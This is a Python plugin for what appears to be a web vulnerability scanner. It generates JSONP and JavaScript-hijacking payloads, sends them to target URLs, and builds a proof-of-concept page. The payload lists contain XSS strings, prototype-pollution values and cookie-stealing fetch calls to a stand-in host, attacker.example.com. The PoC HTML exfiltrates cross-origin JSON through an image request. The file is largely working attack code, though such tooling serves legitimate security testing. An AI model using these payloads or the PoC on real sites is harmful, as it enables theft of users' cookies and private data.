"""
JavaScript Hijacking / JSONP Exploit Plugin

Provides exploit capabilities for JavaScript hijacking and JSONP data exposure:
- JSONP callback injection
- JSON array hijacking PoC generation
- Cross-origin data theft demonstration
"""

import sys
import os
from typing import Dict, List, Any, Optional
import logging

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin
from scanner.plugins.payload_mutator import PayloadMutator

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

logger = logging.getLogger(__name__)


class JSHijackingPlugin(ExploitPlugin):
    """JavaScript Hijacking / JSONP exploit plugin."""

    @property
    def vulnerability_type(self) -> str:
        return 'js_hijacking'

    @property
    def name(self) -> str:
        return 'JavaScript Hijacking / JSONP Exploit'

    @property
    def description(self) -> str:
        return 'Exploits JavaScript hijacking and JSONP data exposure vulnerabilities.'

    @property
    def version(self) -> str:
        return '1.0.0'

    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """Generate JSONP hijacking payloads."""
        context = context or {}
        callback = context.get('callback_param', 'callback')
        attacker_url = context.get('attacker_url', 'https://attacker.example.com/steal')

        payloads = [
            f'?{callback}=alert',
            f'?{callback}=console.log',
            f'?{callback}=eval',
            f'?{callback}=stealData',
            f'?{callback}=Function("fetch(\'{attacker_url}?d=\"+JSON.stringify(arguments[0]))")()',
            # JSONP PoC HTML
            self._generate_poc_html(attacker_url, callback),
            # Additional callback param probes
            '?callback=alert',
            '?jsonp=alert',
            '?cb=alert',
            '?jsoncallback=alert',
            '?json_callback=alert',
            '?call=alert',
            '?func=alert',
            '?fn=alert',
            '?handler=alert',
            '?wrapper=alert',
            '?success=alert',
            '?complete=alert',
            '?callbackFn=alert',
            # Prototype pollution via JSONP
            '?callback=Object.prototype.polluted',
            # XSS via callback
            '?callback=<script>alert(1)</script>',
            '?callback=alert(document.domain)//',
            '?callback=alert%281%29',
            # Array hijacking (overriding Array constructor)
            '?callback=Array',
            '?callback=Object',
        ]
        # Expanded JSONP / JS hijacking payloads
        extra_js = [
            '?jsonp=alert', '?cb=alert', '?jsoncallback=alert',
            '?json_callback=alert', '?call=alert', '?func=alert',
            '?fn=alert', '?handler=alert', '?wrapper=alert',
            '?success=alert', '?complete=alert', '?callbackFn=alert',
            '?callback=Object.prototype.polluted',
            '?callback=<script>alert(1)</script>',
            '?callback=alert(document.domain)//',
            '?callback=alert%281%29',
            '?callback=Array', '?callback=Object',
            '?callback=constructor', '?callback=__proto__',
            '?callback=prototype', '?callback=toString',
            '?callback=valueOf', '?callback=hasOwnProperty',
            '?callback=require', '?callback=process',
            '?callback=global', '?callback=window',
            '?callback=self', '?callback=top',
            '?callback=parent', '?callback=frames',
            '?callback=location', '?callback=document',
            '?callback=XMLHttpRequest', '?callback=fetch',
            '?callback=eval', '?callback=Function',
            '?callback=setTimeout', '?callback=setInterval',
            '?callback=JSON.stringify', '?callback=JSON.parse',
            '?callback=decodeURIComponent', '?callback=encodeURIComponent',
            '?callback=alert(1)%3B', '?callback=alert(1)//',
            '?callback=%61%6c%65%72%74', '?callback=\u0061\u006c\u0065\u0072\u0074',
            '?callback=a;alert(1)//', '?callback=1;alert(1)//',
            '?callback=*/alert(1)/*', '?callback=*/alert(1)//',
            '?_callback=alert', '?__callback=alert',
            '?on_callback=alert', '?on_success=alert',
            '?jscallback=alert', '?jsonCallback=alert',
            '?json_cb=alert', '?jsonCb=alert',
            '?padding=alert', '?pad=alert',
            '?jsonp_callback=alert', '?jsonpCallback=alert',
            '?callbackParam=alert', '?callback_func=alert',
            '?callback_name=alert', '?cbfunc=alert',
            '?cbname=alert', '?cbk=alert',
            '?callbackurl=alert', '?callback_url=alert',
            '?oncomplete=alert', '?onload=alert',
            '?onsuccess=alert', '?onerror=alert',
            '?callback=function(a){alert(a)}',
            '?callback=new Function("alert(1)")',
            '?callback=[].constructor.constructor("alert(1)")()',
        ]
        payloads.extend(extra_js)
        # Generate dynamic JSONP payloads for all common callback param names
        cb_params = ['callback', 'jsonp', 'cb', 'jsoncallback', 'json_callback', 'call',
                     'func', 'fn', 'handler', 'wrapper', 'success', 'complete', 'callbackFn',
                     'callbackParam', 'cbfunc', 'cbname', 'cbk', 'jscallback', 'jsonCallback',
                     'padding', 'pad', 'oncomplete', 'onload', 'onsuccess', 'onerror']
        cb_values = ['alert', 'console.log', 'eval', 'stealData', 'exfil',
                     'Object.prototype.polluted', 'Array', 'Object', 'Function',
                     'alert(1)//', 'alert(document.cookie)//',
                     'window.location="http://attacker.example.com"',
                     '(function(){fetch("http://attacker.example.com?d="+document.cookie)})()']
        dynamic_js = []
        for param in cb_params:
            for val in cb_values:
                dynamic_js.append(f'?{param}={val}')
        payloads.extend(dynamic_js)
        return PayloadMutator.scale_payloads_to_minimum(payloads)

    def _generate_poc_html(self, attacker_url: str, callback: str) -> str:
        return f'''<html>
<body>
<h2>JSONP Hijacking PoC</h2>
<script>
function stealData(data) {{
  var img = new Image();
  img.src = '{attacker_url}?data=' + encodeURIComponent(JSON.stringify(data));
}}
</script>
<script src="TARGET_URL?{callback}=stealData"></script>
</body>
</html>'''

    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                       config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Test for JSONP endpoint and generate PoC."""
        if not HAS_REQUESTS:
            return {
                'success': False,
                'error': 'Requests library not available',
                'vulnerability_type': 'js_hijacking',
            }

        config = config or {}
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)
        callback_params = ['callback', 'jsonp', 'cb', 'jsoncallback', 'json_callback', 'call']

        for param in callback_params:
            try:
                test_value = 'megido_test_callback'
                url = f"{target_url}{'&' if '?' in target_url else '?'}{param}={test_value}"
                resp = requests.get(url, timeout=timeout, verify=verify_ssl)
                if test_value in resp.text:
                    poc_html = self._generate_poc_html(
                        'https://attacker.example.com/steal', param
                    ).replace('TARGET_URL', target_url)
                    return {
                        'success': True,
                        'vulnerability_type': 'js_hijacking',
                        'evidence': f'JSONP callback reflected via parameter "{param}"',
                        'parameter': param,
                        'poc_html': poc_html,
                        'message': 'JSONP hijacking confirmed',
                    }
            except Exception as e:
                logger.debug(f"Error testing JSONP param {param}: {e}")

        return {
            'success': False,
            'error': 'No exploitable JSONP endpoint found',
            'vulnerability_type': 'js_hijacking',
        }
